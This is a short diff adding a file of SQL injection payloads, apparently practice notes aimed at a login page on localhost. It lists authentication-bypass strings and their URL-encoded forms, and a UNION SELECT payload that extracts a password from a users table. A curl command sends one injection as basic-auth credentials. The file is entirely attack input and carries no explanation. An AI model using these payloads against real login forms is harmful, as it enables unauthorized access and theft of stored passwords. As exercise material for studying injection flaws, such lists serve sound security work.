@@ -1,0 +1,7 @@
+admin') or '1'='1
+admin%27%20or%201%3D1%23
+
+admin') or 1=1 or 1=1 UNION SELECT (SELECT min(pass) FROM users) ORDER BY 1 asc limit 1--
+%0Aadmin%27%29%20or%201%3D1%20or%201%3D1%20UNION%20SELECT%20%28SELECT%20min%28pass%29%20FROM%20users%29%20ORDER%20BY%201%20asc%20limit%201--
+
+curl -u admin:admin%27%29%20or%20%271%27%3D%271 https://localhost/login.html
